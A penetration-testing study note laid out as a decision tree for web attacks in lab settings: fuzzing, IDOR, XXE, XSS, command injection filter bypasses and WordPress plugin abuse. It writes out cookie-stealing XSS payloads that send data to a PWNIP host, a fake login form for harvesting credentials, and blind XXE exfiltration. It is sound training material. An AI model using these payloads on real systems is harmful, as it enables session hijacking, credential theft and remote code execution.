# Web Applications, Decision Tree

Part of [[DECISION TREE]]. "I found X, what do I try" for XSS, command injection, vhost pivots, WordPress, and APIs. (SQL injection has its own area: [[SQL Injection & Databases (Decision Tree)]]. Traversal/LFI/RFI: [[File Inclusion & Traversal (Decision Tree)]]. Upload forms: [[File Upload Attacks (Decision Tree)]].)

---

### You have a web target IP and need to start enumerating it
→ **Step 1. Directory fuzz:** `ffuf -w directory-list-2.3-small.txt:FUZZ -u http://TARGET:PORT/FUZZ` to find top-level dirs
→ **Step 2. Extension fuzz:** on each found dir, probe `indexFUZZ` with `web-extensions.txt` to know what extensions the server serves
→ **Step 3. Page fuzz:** `ffuf -u /dir/FUZZ.php` (or your discovered extension) to enumerate pages inside each dir
→ **Step 4. VHost fuzz:** `ffuf -H 'Host: FUZZ.domain.htb' -ac` to find virtual hosts not in public DNS; add them all to `/etc/hosts`
→ **Step 5. Repeat for each vhost:** each new vhost starts the directory/extension/page cycle again
→ See [[Reconnaissance & Enumeration#Ffuf (Web Fuzzer)|Command Appendix ffuf section]] and [[08. Introduction to Web Application Attacks|Introduction to Web Application Attacks]]

### ffuf is flooding output with hundreds of hits — how do I filter it?
→ **Two-step approach:** run first without filters, note the most common response size in the output (that's your noise), re-run with `-fs SIZE` to suppress it
→ **One-step shortcut:** add `-ac` (auto-calibrate) and ffuf works it out itself, it sends calibration requests and sets the filter automatically
→ **Filter by content instead of size:** use `-mr "expected text"` to only show responses whose body contains a specific string. Useful when you know what a valid hit looks like (e.g., `-mr "You don't have access!"` or `-mr "HTB{"`)
→ **Other filter options:** `-fw N` (word count), `-fl N` (line count), if the noise all has the same word count, filtering on words is more reliable than size when responses have slight size variation

### Found a directory — should I page-fuzz it or recursive-fuzz from the start?
→ **Recursive from root** (`-recursion -recursion-depth 1 -e .php`) is the cleaner one-shot approach: finds dirs and pages inside them in one pass
→ **Manual targeting is faster** once you spot a useful dir: cancel recursive scan when you see the queue adding `/courses/FUZZ`, then run a fresh targeted fuzz at just `/courses/FUZZ` instead of waiting for everything else. The skills assessment demonstrates this speedup
→ **Depth tradeoff:** `-recursion-depth 1` catches one level below your starting path. Set to 2 for deeper coverage but scan time grows exponentially

### Found a page — how do I find what parameters it accepts?
→ **GET parameters:** `ffuf -w burp-parameter-names.txt:FUZZ -u '/page.php?FUZZ=key' -fs NOISE_SIZE`
→ **POST parameters:** `ffuf -w burp-parameter-names.txt:FUZZ -u '/page.php' -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs NOISE_SIZE`
→ Always include `Content-Type: application/x-www-form-urlencoded` for POST form fuzzing or the server may not parse the body
→ The dummy value (`key`) doesn't matter here, you're finding parameter NAMES that change the response, not valid values yet
→ Once you have parameter names, value-fuzz separately: `-d 'param=FUZZ'` with a relevant wordlist (names list, numeric seq, rockyou)
→ See [[08. Introduction to Web Application Attacks#8.2.5. Fuzzing with Ffuf|Ffuf parameter and value fuzzing]]

---

### A page requires HTTP Basic Auth or blocks a specific action — only on GET/POST
→ Switch the HTTP method to OPTIONS or PATCH in Burp Repeater, servers commonly require auth for `GET` and `POST` but forget to configure the rule for all other verbs
→ If the action sends a POST body, right-click in Burp → "Change request method", params move to URL query string, Burp rewrites the method automatically
→ Also try GET with params in the URL when a filter blocks the POST body, if the backend reads `$_REQUEST` (catches both), the same endpoint handles the request but the POST-only filter never sees it
→ See [[09. Common Web Application Attacks#9.5.1. HTTP Verb Tampering|HTTP verb tampering]], [[Web Applications#HTTP Verb Tampering|Command Appendix]]

### Found an API endpoint or page that loads data using a user ID, UID, or object ID in the URL or parameters
→ This is an IDOR candidate: change the ID value in Burp Repeater and check whether someone else's data comes back, no auth check on the ID = IDOR
→ **Mass enumerate:** loop 1-100 with a bash script, grep for role/admin/privilege keywords in JSON responses
→ **Encoded IDs (base64/MD5):** view page source to identify the encoding, reproduce client-side in a loop (`echo -n 1 | base64 -w 0`, `echo -n 1 | md5sum | cut -d' ' -f1`)
→ **Chaining:** if you can read (GET IDOR) but get "Access Denied" on write, the write endpoint likely requires the target user's `uuid`. Read it via the GET IDOR, then use it in the write request (PUT/POST) to the admin's endpoint
→ **Verb tamper the write endpoint if still denied:** POST → GET may bypass a session-vs-uid check that only applies to POST
→ See [[09. Common Web Application Attacks#9.5.2. IDOR (Insecure Direct Object Reference)|IDOR enumeration and exploitation]], [[Web Applications#IDOR. Insecure Direct Object Reference|Command Appendix]]

### A form submission contains XML in the body (Content-Type: application/xml or body starts with <?xml)
→ This is an XXE candidate. Inject `<!ENTITY test "HELLO">` and reference `&test;` in a reflected field, if "HELLO" appears in the response, external entities are being resolved
→ **Read a file:** `<!DOCTYPE email [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`, reference `&xxe;` in any field that reflects
→ **PHP source (files with `<?php`):** use php://filter base64-encode, avoids XML-breaking characters, then decode the blob: `echo 'BLOB' | base64 -d`
→ **No reflection / XML-breaking chars in target file:** use CDATA external DTD (create `XXE.dtd` with `%begin;%file;%end;` parameter entities, host on `python3 -m http.server`, load via `SYSTEM "http://PWNIP/XXE.dtd"`)
→ **No reflection AND no errors in response (blind):** OOB exfiltration. DTD with `php://filter base64` resource + HTTP callback `?content=%file;`, capture base64 blob in python HTTP server log
→ See [[09. Common Web Application Attacks#9.5.3. XXE (XML External Entity Injection)|XXE disclosure and blind exfiltration]], [[Web Applications#XXE. XML External Entity Injection|Command Appendix]]

### Found an input field that reflects your input back into the page
→ Test with `< > ' " { } ;` and see what survives unencoded
→ Is reflection happening in the server's HTML response OR only in the browser's rendered DOM? Open the page source (`Ctrl+U`) and search for your input. If it's there: Stored or Reflected XSS. If it's NOT in raw source but is in the browser's DOM: DOM-based XSS
→ **`<script>alert(1)</script>` not working?** Try `"><script>alert(1)</script>` (closes an open `"` attribute context) or `'><img src=x onerror=alert(1)>` (event-handler, bypasses `<script>` blocking and works inside DOM sinks)
→ **Confirm execution** with `alert(document.cookie)` to get the actual cookie value, same payloads, just swap `1` for `document.cookie`
→ See [[08. Introduction to Web Application Attacks#8.4.3. Identifying XSS Vulnerabilities|8.4.3]], [[08. Introduction to Web Application Attacks#8.4.6. XSS Types in Practice, and Finding the Vulnerable Parameter|XSS.1]]

### You've confirmed XSS — what do you do with it?
→ **Goal: steal an active session cookie** (someone is currently logged in and you want to impersonate them): deploy `new Image().src='http://PWNIP/index.php?c='+document.cookie` via `><script src=http://PWNIP/script.js></script>`. Run `php -S 0.0.0.0:8080` with the PHP cookie catcher to receive it, then set it in Firefox DevTools → Storage → Cookies
→ **Goal: harvest credentials from someone** (they need to type them in): inject a fake login form via `document.write()` that POSTs to your PHP listener. Include `document.getElementById('FORMID').remove()` to hide the real form. Run PHP listener with `header("Location: ...")` redirect so victim doesn't notice
→ **Goal: XSS PoC / flag hidden in a cookie**: `alert(document.cookie)` is enough, the flag appears in the alert box
→ See [[08. Introduction to Web Application Attacks#8.4.7. Phishing via XSS|XSS.6]] (phishing form), [[08. Introduction to Web Application Attacks#8.4.8. Session Hijacking via Cookie Exfiltration|XSS.7]] (cookie steal), [[Web Applications#XSS Testing and Basic Payloads|Command Appendix]]

### Submitted content says "must be approved by an admin" — blind XSS scenario
→ You can't see execution directly. Use a unique filename per field to fingerprint via outbound HTTP: inject `'><script src="http://PWNIP:PORT/FieldName"></script>` in each field (vary the filename), start `nc -nvlp PORT`, submit, wait
→ The `GET /FieldName` request that arrives at nc tells you which field is vulnerable. A `HeadlessChrome` or bot-looking User-Agent in the request header confirms an automated reviewer is loading the page
→ Once the field is confirmed, swap nc for the full PHP cookie-steal server (`script.js` + `index.php`) and re-inject. The admin's cookie arrives at your PHP server in the next review cycle
→ See [[08. Introduction to Web Application Attacks#8.4.9. Blind XSS Skills Assessment|XSS.8 blind XSS walkthrough]], [[Web Applications#XSS. Blind XSS Detection|Command Appendix]]

### XSS payload keeps getting filtered (special chars stripped or script tag blocked)
→ Filter only checking `<script>`? Try event-handler approach: `<img src="" onerror=payload>`, `<body onload=payload>`, `<svg onload=payload>`
→ `<` and `>` both getting stripped? Check if you're inside a JS string context already, you may not need them: `';alert(1);//` closes the string, runs payload, comments the rest out
→ Quotes getting HTML-encoded? Try `&apos;` or JavaScript's `String.fromCharCode()` to avoid raw quote characters: `eval(String.fromCharCode(97,108,101,114,116,40,49,41))`
→ Double-quote `"` stripped but single `'` survives? Use single quotes throughout and vice versa (see the "character disappears" gotcha below)
→ Heavy sanitisation? Try [PayloadsAllTheThings XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) for context-specific bypass payloads

### Found a form/field whose value looks like an OS command (a URL for `git clone`, a filename passed to some system tool, etc)
→ Try replacing the value entirely with a harmless command (`id`, `ipconfig`). Filtered? Confirm the expected command alone still works, then chain a second one with a URL-encoded `;` (`%3B`), `&&`, or (CMD) `&`
→ `git version` (or equivalent) output tells you Windows vs Linux in one shot
→ On Windows, use PetSerAl's one-liner to check CMD vs PowerShell before picking a reverse shell syntax
→ See [[09. Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]]

### Found a field with no obvious command hint (no `git clone`-style placeholder), but it feels off
→ Work through injection types systematically rather than guessing: try arithmetic (`1%2B1`, is it evaluated to `2`?), then template syntax (`{{7*7}}`, is it `49`?), then shell metacharacters (backticks, `$()`). Watch for **any change in behavior**, not just a direct hit, a response going blank instead of echoing your literal input is itself a signal something's being evaluated
→ See [[09. Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1 case study 3]] for the full walkthrough of this exact reasoning process

### A character in your payload disappears from the reflected response entirely (not HTML-escaped, just gone)
→ That's active filtering of that specific character, not passive echoing. Common culprit: `"` stripped while `'` survives. Switch quote style in your payload rather than assuming the whole injection point is dead

### Found command injection but the operator you tried (`;`, `&&`) is blocked
→ Test each operator in order. WAF rules commonly block `;` and `|` but miss newline:
  1. `%0a` (URL-encoded newline), the most commonly missed by filters; bash treats it identically to `;`
  2. `%26` (`&`), often whitelisted as a URL query-string separator; the shell still runs both commands
  3. `%7c` (`|`), shows only the second command's output (cleaner, but may be blocked)
  4. `%7c%7c` (`||`), second command runs only if first fails; useful if the original command is invalid
→ See [[09. Common Web Application Attacks#9.4.2. Command Injection Filter Bypass Techniques|CI.2]], [[Web Applications#Command Injection. Operator Table|Command Appendix]]

### Command injection confirmed but spaces in the payload are filtered or stripped
→ Replace every space with one of: `$IFS` (bash Internal Field Separator, most reliable), `${IFS}` (explicit brace form), `%09` (URL-encoded tab), `{cmd,-arg}` (brace expansion)
→ Example: `ls$IFS-la` or `{ls,-la}`, both run `ls -la` with no literal space in the payload
→ See [[09. Common Web Application Attacks#9.4.2. Command Injection Filter Bypass Techniques|CI.3]], [[Web Applications#Command Injection. Filter Bypass Ladder|Command Appendix]]

### Slash `/` is filtered — can't type paths
→ Extract it from an environment variable: `${PATH:0:1}`. PATH always starts with `/`, so this slices that first character
→ Build full paths: `cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd` (replaces both `/`s)
→ Other chars from env vars: `${HOME:0:1}` also gives `/`; inspect `$PATH`/`$LOGNAME`/`$TERM` values to find other characters at specific positions
→ See [[09. Common Web Application Attacks#9.4.2. Command Injection Filter Bypass Techniques|CI.4]]

### Specific commands (`cat`, `ls`, `whoami`) are on a blacklist
→ Quote insertion: bash removes unescaped quotes before execution, so `c'a't` runs as `cat`, the blacklist comparison sees `c'a't` and finds no match
→ Works with both single and double quotes: `c"a"t`, `w'h'o'a'm'i`, `/bin/c'a't`
→ See [[09. Common Web Application Attacks#9.4.2. Command Injection Filter Bypass Techniques|CI.5]]

### Multiple filters active at once — spaces, slashes, and specific commands all blocked
→ Base64-encode the entire command, bypasses all character-level filters simultaneously
→ On Kali: `echo -n 'your full command here' | base64`, copy the output
→ Payload: `bash<<<$(base64%09-d<<<BASE64HERE)` (`%09` is a tab, replaces the space before `-d`)
→ `<<<` is a here-string, no pipe character needed, so `|` filter doesn't block it
→ Combined with new-line bypass: `ip=127.0.0.1%0abash<<<$(base64%09-d<<<BASE64HERE)`
→ See [[09. Common Web Application Attacks#9.4.2. Command Injection Filter Bypass Techniques|CI.6]], [[Web Applications#Command Injection. Filter Bypass Ladder|Command Appendix]]

### Command injection in a feature that shows no output (file manager Move, file rename, background processor)
→ Check if the *error* path leaks output, cause the first command to fail (missing required argument, invalid path) so the app enters its error-handling branch, then chain the real command with `&`/`%26`
→ The error message carries the second command's stdout, without needing a separate exfil channel
→ Error-based output + `%26` is the typical skills assessment pattern for filtered file-manager injection
→ See [[09. Common Web Application Attacks#9.4.2. Command Injection Filter Bypass Techniques|CI.7]]

### A site's own content mentions another hostname/domain you haven't scanned yet
→ Classic vhost pivot: the real vulnerable app often lives on a name-based virtual host the landing page just happens to link to or mention in its text. Add it to `/etc/hosts` pointing at the same IP and check it directly
```bash
echo "<target-ip> <other-hostname>" | sudo tee -a /etc/hosts
curl http://<other-hostname>/
```
→ See [[10. SQL Injection Attacks#🏆 Capstone Labs|Capstone Labs]] (Alvida Coffee's landing page linking to `alvida-eatery.local`, the actual WordPress target)

### Found a WordPress site and need to find the actual vulnerability
→ Fingerprint every installed plugin's version via its `readme.txt` (`curl http://<target>/wp-content/plugins/<name>/readme.txt`, no auth needed), then `searchsploit <plugin name>` for each one until something matches
→ Unauthenticated SQLi in a plugin usually routes through the shared `wp-admin/admin-ajax.php?action=<name>` endpoint regardless of login state
→ See [[Web Applications#WordPress|Command Appendix's WordPress section]] and [[10. SQL Injection Attacks#🏆 Capstone Labs|Capstone Labs]] (Perfect Survey plugin, CVE-2021-24762)

### Got WordPress admin creds, but Appearance/Plugin Editor says "Unable to communicate back with site... PHP change was reverted"
→ That's WP's built-in fatal-error-protection: it saves your edit, then does a loopback HTTP request to itself to check for a fatal error before committing. On isolated lab networks the server often can't loop back to its own hostname, so the check always fails and the edit gets silently reverted
→ Go around it with plugin upload instead (**Plugins → Add New → Upload Plugin**), which has no such live-check at upload time. A single-file plugin with just a `Plugin Name:` header comment and your payload code is enough
→ See [[Web Applications#WordPress|Command Appendix's WordPress section]] for the exact zip/upload steps

### Found a REST API (or suspect one)
→ Brute force versioned paths (`gobuster` with a `{GOBUSTER}/v1` pattern file)
→ Probe with `curl`, watch for `405` vs `404` (405 means the path exists, wrong HTTP method), full reasoning: [[Web Applications (Breakdowns)#Why 405 (not 404) means the path exists, just the wrong HTTP method|Command Breakdowns]]
→ Check for mass assignment (extra fields like `"admin":"True"` in a register/create request)
→ See [[08. Introduction to Web Application Attacks#8.3.3. Enumerating and Abusing APIs|8.3.3]]

### Firefox stops loading anything at all, mid-engagement
→ Check whether Burp Suite's proxy is still set in Firefox's network settings but Burp itself got closed, the browser has nowhere to send traffic and everything hangs/fails
→ Fix: restart Burp, or revert Firefox's proxy setting back to "No proxy" / "Use system proxy"
→ Setup reference: [[Web Applications#Burp Suite|Command Appendix]]
→ See [[08. Introduction to Web Application Attacks#8.2.4. Security Testing with Burp Suite|8.2.4]]
